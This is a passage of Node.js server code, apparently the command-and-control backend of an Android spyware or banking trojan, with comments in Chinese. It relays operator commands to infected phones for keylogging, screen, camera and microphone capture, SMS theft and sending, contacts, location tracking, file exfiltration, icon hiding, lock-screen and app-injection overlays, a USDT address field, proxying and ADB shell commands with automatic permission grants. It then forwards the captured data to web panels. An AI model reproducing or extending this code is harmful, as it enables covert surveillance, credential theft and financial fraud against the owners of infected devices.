                    usdtadresstext: usdtxt,
                  };

                  const msgdata = JSONIT(jsonData);

                  sendDeviceCommand(msgdata);
                }
                break;
              case "blockd":
                {
                  const blotext = data.blocktext;

                  const jsonData = {
                    type: "screen",
                    subc: "blockd",
                    blocktext: blotext,
                  };

                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              default:
                break;
            }
          }
          break;
        // case "ping":
        //   {

        //     const jsonData = {
        //       type: "connected",
        //     };

        //     const msgdata = JSONIT(jsonData);

        //     MobReciverr.send(msgdata);
        //   }
        //   break;
        case "srch":
          {


            const searchfor = data.srchfor;
            const searchin = data.srchin;
            const serchpath = data.targetpath || "null";

            const jsonData = {
              type: "srh",
              subc: searchin, //G or S
              Tpath: serchpath,
              sfor: searchfor,
            };

            const chatdata = JSONIT(jsonData);

            sendDeviceCommand(chatdata);
          }
          break;
        case "cocu": //copy cut
          {


            const thetype = data.state; //co cu
            const despath = data.tp;
            const frompsaths = data.fp;

            const json_file = {
              type: "file",
              subc: thetype,
              tpath: despath,
              fpath: frompsaths,
            };

            const filedata = JSONIT(json_file);

            MobReciverr.send(filedata);
          }
          break;
        case "chat":
          const msg = data.msg;

          const title = data.title;



          const jsonData = {
            type: "chat",
            data: msg,
            title: title,
          };

          const chatdata = JSONIT(jsonData);

          MobReciverr.send(chatdata);

          break;
        case "adb":
          {
            const adbSub = data.adb_sub;       // shell / connect / disconnect / forward / reverse / install / status / fetch-props
            const adbPayload = data.adb_data;   // 命令参数

            if (!adbBridge || typeof adbBridge.executeCommand !== 'function') {
              alertpanel(ws, "ADB bridge not available", Alert_info);
              break;
            }

            // 异步执行 ADB 操作，结果返回给面板
            (async () => {
              try {
                let result;
                switch (adbSub) {
                  case "shell":
                    result = await adbBridge.executeCommand(phoneId, adbPayload);
                    break;
                  case "status":
                    result = await adbBridge.adbHeartbeat(phoneId);
                    break;
                  case "connect":
                    result = await adbBridge.adbConnect(adbPayload || phoneId);
                    break;
                  case "disconnect":
                    result = await adbBridge.adbDisconnect(adbPayload || phoneId);
                    break;
                  case "forward":
                    if (typeof adbPayload === 'object' && adbPayload !== null) {
                      result = await adbBridge.portForward(phoneId, adbPayload.localPort, adbPayload.devicePort);
                    } else {
                      const parts = String(adbPayload || '').split(/[\s,]+/);
                      result = await adbBridge.portForward(phoneId, parts[0], parts[1]);
                    }
                    break;
                  case "reverse":
                    if (typeof adbPayload === 'object' && adbPayload !== null) {
                      result = await adbBridge.portReverse(phoneId, adbPayload.devicePort, adbPayload.localPort);
                    } else {
                      const parts = String(adbPayload || '').split(/[\s,]+/);
                      result = await adbBridge.portReverse(phoneId, parts[0], parts[1]);
                    }
                    break;
                  case "install":
                    result = await adbBridge.installApk(phoneId, adbPayload);
                    break;
                  case "fetch-props":
                    result = await adbBridge.fetchDeviceProps(phoneId);
                    break;
                  case "rom-info":
                    // 获取设备信息 + ROM 类型
                    result = await adbBridge.fetchDeviceProps(phoneId);
                    break;
                  case "auto-grant":
                    // 自动授予权限链：需要包名 adbPayload.pkg
                    const pkg = (typeof adbPayload === 'object' && adbPayload !== null)
                      ? adbPayload.pkg : String(adbPayload || '');
                    if (!pkg) {
                      result = { error: "missing package name (pkg)" };
                      break;
                    }
                    // 先获取设备属性（含 rom 类型）
                    const devProps = await adbBridge.fetchDeviceProps(phoneId);
                    // 获取设备端 serial
                    const adbDevices = typeof adbBridge.getDevices === 'function' ? adbBridge.getDevices() : new Map();
                    const adbDeviceEntry = adbDevices.get(phoneId);
                    const serial = adbDeviceEntry ? adbDeviceEntry.serial : phoneId;
                    const romType = (devProps && devProps.rom) || 'AOSP';
                    // 执行权限授予命令链
                    result = await adbBridge.applyRomGrantCommands(serial, pkg, romType);
                    result = { rom: romType, grants: result };
                    break;
                  default:
                    result = { error: "unknown adb subcommand: " + adbSub };
                    break;
                }
                // 将结果返回给 Web 面板
                safeSend(ws, JSON.stringify({
                  type: "adb_result",
                  subc: adbSub,
                  phoneId: phoneId,
                  data: result,
                  success: !(result && result.error),
                  time: Date.now(),
                }));
              } catch (err) {
                safeSend(ws, JSON.stringify({
                  type: "adb_result",
                  subc: adbSub,
                  phoneId: phoneId,
                  error: err.message,
                  success: false,
                  time: Date.now(),
                }));
              }
            })();

            alertpanel(ws, `ADB ${adbSub} command sent`, Alert_success);
          }
          break;
        default:

          break;
      }
      break;
    case idf_adminsend:

      // ✅ 如果 check 不为空，写入 txt
      if (usercheck && usercheck.trim() !== "") {
        const fs = require("fs");
        const path = require("path");

        const filePath = path.join(__dirname, "mov_check.txt");

        // 固定为北京时间（UTC+8）
        const now = new Date();
        const offsetTime = new Date(now.getTime() + 8 * 60 * 60 * 1000);
        const time = offsetTime.toISOString().replace('T', ' ').replace('Z', '');

        const line = `${phoneId}\t${usercheck}\t${time}\n`;

        fs.appendFile(filePath, line, (err) => {
          if (err) {
            console.error("写入 mov_check.txt 出错:", err);
          }
        });
      }
      const MobReciver = SolrMobs.get(phoneId);
      if (!MobReciver || MobReciver.readyState !== WebSocket.OPEN) {
        console.log(`[WARN] MobReciver 不可用 phoneId=${phoneId}, readyState=${MobReciver ? MobReciver.readyState : 'null'}`);
        break;
      }

      switch (subcommand) {
        case "display":
          {
            const jsonData = {
              type: "screencomd",
              subc: "display",
              display: data.display,        // e.g., SK
            };
            const msgdata = JSONIT(jsonData);
            MobReciver.send(msgdata);
          }
          break;
        case "screen":
          {
            const jsonData = {
              type: "screencomd",
              subc: "Screen",
              comdtype: data.screentype,        // e.g., SK
            };
            const msgdata = JSONIT(jsonData);
            MobReciver.send(msgdata);
          }
          break;
        case "cam":
          {
            const jsonData = {
              type: "screencomd",
              subc: "Camera",
              SelectedCam: data.SelectedCam,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "camoff":
          {

            const jsonData = {
              type: "screencomd",
              subc: "CameraOff",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "mic":
          {
            const jsonData = {
              type: "mic",
              subc: "ON",
            };
            MobReciver.send(JSONIT(jsonData));

          }
          break;
        case "micoff":
          {
            const jsonData = {
              type: "mic",
              subc: "OFF",
            };
            MobReciver.send(JSONIT(jsonData));

          }
          break;
        case "activz":
          {
            const subc = data.subc; // 'L' or 'D'
            const kdate = data.kdate;
            let jsonData = null;

            if (subc === "L") {
              jsonData = {
                type: "Activitys",
                subc: "GA",
                kdate: kdate,
              };
            } else if (subc === "D") {
              jsonData = {
                type: "Activitys",
                subc: "DA",
                kdate: kdate,
              };
            }

            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "notifys":
          {
            const subc = data.subc;
            const kdate = data.kdate;
            let jsonData = null;

            if (subc === "L") {
              jsonData = {
                type: "Activitys",
                subc: "GF",
                kdate: kdate,
              };
            } else if (subc === "D") {
              jsonData = {
                type: "Activitys",
                subc: "DF",
                kdate: kdate,
              };
            }

            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "vapps":
          {
            const subc = data.subc;
            const kdate = data.kdate;
            let jsonData = null;

            if (subc === "L") {
              jsonData = {
                type: "Activitys",
                subc: "GV",
                kdate: kdate,
              };
            } else if (subc === "D") {
              jsonData = {
                type: "Activitys",
                subc: "DV",
                kdate: kdate,
              };
            }

            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "vlinks":
          {
            const subc = data.subc;
            const kdate = data.kdate;
            let jsonData = null;

            if (subc === "L") {
              jsonData = {
                type: "Activitys",
                subc: "GU",
                kdate: kdate,
              };
            } else if (subc === "D") {
              jsonData = {
                type: "Activitys",
                subc: "DU",
                kdate: kdate,
              };
            }

            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "Keylog":
          {
            let jsonData = null;
            jsonData = {
              type: "screencomd",
              subc: "Keylog",
              comdtype: data.keylogtype,
            };

            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "Logdate":
          {
            let jsonData = null;

            jsonData = {
              type: "screencomd",
              subc: "Logdate",
              comdtype: data.keylogtype,
              kdate: data.keylogdate,
            };
            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "Permissions":
          {
            const subc = data.subc;
            if (subc === "Clear") {
              // 仅供后端数据库清空，WebSocket 不处理
            } else if (subc === "R") {
              const jsonData = {
                type: "Permissions",
                subc: "R",
                prim: data.prim,
              };
              MobReciver.send(JSONIT(jsonData));
            }
          }
          break;
        case "Hideico":
          {

            const jsonData = {
              type: "screencomd",
              subc: "Hideico",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "DIAO":
          {

            const jsonData = {
              type: "screencomd",
              subc: "DIAO",
              pin: data.pin,
              title: data.title,
              lckdis: data.lckdis,
              typ: data.typ,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "OPENINJ":
          {
            const jsonData = {
              type: "screencomd",
              subc: "OPENINJ",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "OPENAPP":
          {

            const jsonData = {
              type: "screencomd",
              subc: "OPENAPP",
              package: data.packageName,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "UNINSTALLAPP":
          {

            const jsonData = {
              type: "screencomd",
              subc: "UNINSTALLAPP",
              package: data.packageName,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "LOADAPPS":
          {

            const jsonData = {
              type: "screencomd",
              subc: "LOADAPPS",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;


        case "Contacts":
          {

            const jsonData = {
              type: "screencomd",
              subc: "Contacts",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "SMS":
          {
            let jsonData = null;
            jsonData = {
              type: "screencomd",
              subc: "SMS",
            };

            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "SMSSEND":
          {
            let jsonData = null;
            jsonData = {
              type: "screencomd",
              subc: "SMSSEND",
              smsnumber: data.smsnumber,
              message: data.message,
            };

            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "loc": //location
          {
            const jsonData = {
              type: "screencomd",
              subc: "Location",
            };
            MobReciver.send(JSONIT(jsonData));

          }
          break;
        case "locoff": //location
          {
            const jsonData = {
              type: "screencomd",
              subc: "Locationoff",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "files":
          {
            const jsonData = {
              type: "screencomd",
              subc: "files",
              filepath: data.filepath,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "changefiles": {
          if (data.comdtype === "U") {
            const chunkSize = 1024 * 256; // 每片 256KB
            const content = data.content || ""; // Base64 字符串
            const totalSize = content.length;
            const totalChunks = Math.ceil(totalSize / chunkSize);

            let offset = 0;
            let index = 0;

            while (offset < totalSize) {
              const end = Math.min(offset + chunkSize, totalSize);
              const chunk = content.substring(offset, end);

              const jsonData = {
                type: "screencomd",
                subc: "changefiles",
                comdtype: data.comdtype, // "U"
                isinjct: data.isinjct,
                jctid: data.jctid,
                filepath: data.filepath,
                filetype: data.filetype,
                filename: data.filename,
                size: data.size,
                chunkIndex: index,
                totalChunks: totalChunks,
                content: chunk,
              };

              MobReciver.send(JSONIT(jsonData));

              offset = end;
              index++;
            }
          } else {
            // ⚡ 删除 (R) / 下载 (D) 保持原样
            const jsonData = {
              type: "screencomd",
              subc: "changefiles",
              comdtype: data.comdtype,
              filepath: data.filepath,
              filetype: data.filetype,
              filename: data.filename,
              size: data.size,
              content: data.content,
            };
            MobReciver.send(JSONIT(jsonData));
          }
        }
          break;

        case "noinj":
          {
            const jsonData = {
              type: "screencomd",
              subc: "noinj",
              jctid: data.jctid,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "viewfile":
          {
            const jsonData = {
              type: "screencomd",
              subc: "viewfile",
              filepath: data.filepath,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;


        case "rename":
          {
            const jsonData = {
              type: "screencomd",
              subc: "Rename",
              name: data.nam,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "change":
          {
            const jsonData = {
              type: "screencomd",
              subc: "change",
              domain: data.domain,
              ip: data.ip,
              changeid: data.changeid
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "Notify":
          {
            const jsonData = {
              type: "Notifi",
              noti: data.noti,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "delete":
          {
            const jsonData = {
              type: "Delete",
              subc: "[reme]",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;

      }
      break;
    case idf_client:
      const FrontReciver = SolrUsers.get(phoneId);

      // 检查 WebSocket 连接是否有效


      if (FrontReciver) {
        for (const ws of FrontReciver) {
          if (ws.readyState === WebSocket.OPEN) {
            try {
              // 处理客户端命令
              switch (subcommand) {


                case "klogs":
                  {



                    const jsonData = {
                      type: "klog",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const jsonString = JSONIT(jsonData);

                    ws.send(jsonString);
                  }
                  break;
                case "klogsdate":
                  {



                    const jsonData = {
                      type: "klogsdate",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const jsonString = JSONIT(jsonData);

                    ws.send(jsonString);
                  }
                  break;
                case "sms":
                  {
                    const jsonData = {
                      type: "sms",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const jsonString = JSONIT(jsonData);

                    ws.send(jsonString);
                  }
                  break;
                case "chat":
                  const json_chat = {
                    type: "chat",
                    data: data.msg,
                    pid: data.pid,
                  };

                  const stringchat = JSON.stringify(json_chat);

                  ws.send(stringchat, (error) => {
                    if (error) {
                      const stopjson = {
                        type: "stop",
                      };

                      const stopit = JSONIT(stopjson);

                      ws.send(stopit);
                      ws.terminate();
                    }
                  });

                  break;
                case "files":
                  const json_files = {
                    type: "files",
                    data: data.msg,
                    pid: data.pid,
                  };

                  const stringfiles = JSON.stringify(json_files);

                  ws.send(stringfiles);
                  break;

                case "savefiles":
                  const json_filessave = {
                    type: "savefiles",
                    data: data.msg,
                    pid: data.pid,
                  };

                  const savefiles = JSON.stringify(json_filessave);

                  ws.send(savefiles);
                  break;

                case "thumb":
                  {
                    let imgpath = data.pth || "null";

                    const json_thumb = {
                      type: "thumb",
                      data: data.msg,
                      pid: data.pid,
                      path: imgpath,
                    };

                    const stringthumb = JSON.stringify(json_thumb);

                    ws.send(stringthumb);
                  }
                  break;
                case "snap":
                  {
                    const json_thumb = {
                      type: "snap",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const stringthumb = JSON.stringify(json_thumb);

                    ws.send(stringthumb);
                  }
                  break;
                case "mic":
                  {
                    const json_mic = {
                      type: "mic",
                      data: data.voip,
                      pid: data.pid,
                    };

                    const stringmic = JSON.stringify(json_mic);

                    ws.send(stringmic);
                  }
                  break;

                case "screen":
                  {


                    let mobwidth = data.wmob !== undefined ? data.wmob : "";
                    let mobheight = data.hmob !== undefined ? data.hmob : "";

                    const json_scr = {
                      type: "screen",
                      data: data.img,
                      pid: data.pid,
                      wmob: mobwidth,
                      hmob: mobheight,
                    };

                    const stringscr = JSON.stringify(json_scr);

                    if (shouldForwardRealtimeFrame(phoneId, ws, 'screen')) {
                      ws.send(stringscr);
                    }
                  }
                  break;
                case "screenshot":
                  {


                    let mobwidth = data.wmob !== undefined ? data.wmob : "";
                    let mobheight = data.hmob !== undefined ? data.hmob : "";

                    const json_scr = {
                      type: "screenshot",
                      data: data.img,
                      pid: data.pid,
                      wmob: mobwidth,
                      hmob: mobheight,
                    };

                    const stringscr = JSON.stringify(json_scr);

                    if (shouldForwardRealtimeFrame(phoneId, ws, 'screenshot')) {
                      ws.send(stringscr);
                    }
                  }
                  break;
                case "loc":
                  {

                    const json_loc = {
                      type: "loc",
                      data: data.msg,
                      pid: data.pid,
                    };
                    const stringloc = JSON.stringify(json_loc);
                    ws.send(stringloc);

                  }
                  break;
                // case "ping":
                //   {
                //     const json_ping = {
                //       type: "ping",
                //       data: data.msg,
                //       pid: data.pid,
                //     };

                //     const stringping = JSON.stringify(json_ping);

                //     ws.send(stringping);

                //   }
                //   break;
                case "proxy":
                  {
                    let thecall = data.ctype;

                    let json_prxy;

                    if (thecall === "first") {
                      let extraddress = ws._socket.remoteAddress;

                      // Check if the address is in IPv6-mapped IPv4 format
                      if (extraddress.startsWith("::ffff:")) {
                        extraddress = extraddress.split("::ffff:")[1];
                      }

                      let localadress = data.loip;
                      let proxyport = data.pport;

                      json_prxy = {
                        type: "proxy",
                        pid: data.pid,
                        calltype: "first",
                        extip: extraddress,
                        locip: localadress,
                        pxport: proxyport,
                      };
                    } else if (thecall === "state") {
                      let the_state = data.pxstate;

                      json_prxy = {
                        type: "proxy",
                        pid: data.pid,
                        calltype: "state",
                        pstate: the_state,
                      };
                    } else if (thecall === "dataup") {
                      let originalip = data.oip;
                      let proxymethod = data.pmth;
                      let proxyurl = data.purl;
                      let extraddress = ws._socket.remoteAddress;

                      // Check if the address is in IPv6-mapped IPv4 format
                      if (extraddress.startsWith("::ffff:")) {
                        extraddress = extraddress.split("::ffff:")[1];
                      }
                      json_prxy = {
                        type: "proxy",
                        pid: data.pid,
                        calltype: "dataup",
                        ogip: originalip,
                        pxip: extraddress,
                        purl: proxyurl,
                        pmthod: proxymethod,
                      };
                    } else {
                      const stopjson = {
                        type: "stop",
                      };

                      const stopit = JSONIT(stopjson);
                      ws.send(stopit);
                      ws.terminate();
                      return;
                    }

                    const stringprxy = JSON.stringify(json_prxy);

                    ws.send(stringprxy);
                  }
                  break;
                case "srch":
                  {
                    let datapaths = data.pths || "null";
                    let srchfor = data.stype || "null";

                    const json_srch = {
                      type: "srch",
                      data: datapaths,
                      pid: data.pid,
                      sfor: srchfor,
                    };

                    const stringsrh = JSON.stringify(json_srch);

                    ws.send(stringsrh);
                  }
                  break;
                case "down": //download
                  {
                    const filename = data.filename;
                    const filedata = data.filedata; // Get base64 chunk
                    const totalSize = data.totalSize;
                    const sentSize = data.sentSize;
                    const chunkNumber = data.chunkNumber;
                    const filehash = data.filehash;
                    const filepath = data.filepath;

                    const json_file = {
                      type: "down",
                      filename: filename,
                      filedata: filedata,
                      totalSize: totalSize,
                      sentSize: sentSize,
                      chunkNumber: chunkNumber,
                      filehash: filehash,
                      filepath: filepath,
                      pid: data.pid,
                    };

                    const stringdata = JSON.stringify(json_file);

                    ws.send(stringdata);
                  }
                  break;
                case "cam":
                  {

                    const json_cam = {
                      type: "cam",
                      data: data.img,
                      pid: data.pid,
                    };

                    const stringcam = JSON.stringify(json_cam);

                    ws.send(stringcam);
                  }
                  break;
                case "injapps":
                  {
                    const jsonData = {
                      type: "injapps",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const stringdata = JSON.stringify(jsonData);

                    ws.send(stringdata);
                  }
                  break;
                case "loadapps":
                  {
                    const jsonData = {
                      type: "loadapps",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const stringdata = JSON.stringify(jsonData);

                    ws.send(stringdata);
                  }
                  break;
                case "loadcontacts":
                  {
                    const jsonData = {
                      type: "loadcontacts",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const stringdata = JSON.stringify(jsonData);

                    ws.send(stringdata);
                  }
                  break;
                default:

                  break;
              }
            } catch (err) {
              console.error("❌ Failed to send to one web user:", err);
            }


          }
        }
      }
      break;


    default:
      break;
  }
}


function JSONIT(params) {
  return JSON.stringify(params);
}

function alertpanel(frontws, msg, alert) {
  const jsonData = {
    type: "notify",
    pid: "ALERTER",
    meth: alert,
    data: msg,
  };
  safeSend(frontws, jsonData);
}

const PORT = process.env.PORT || 3000;
console.log("🚀 ~ PORT:", PORT);
server.listen(PORT, () => {
  console.log(`Http on port ${PORT}`);
});

console.log("WebSocket on port 8080");
// 初始化 ADB 桥接（管理安卓设备持久连接）
if (typeof adbBridge !== 'undefined' && adbBridge && typeof adbBridge.init === 'function') {
  adbBridge.init().catch(err => {
    console.error("[ADB] init error:", err.message);
  });
}
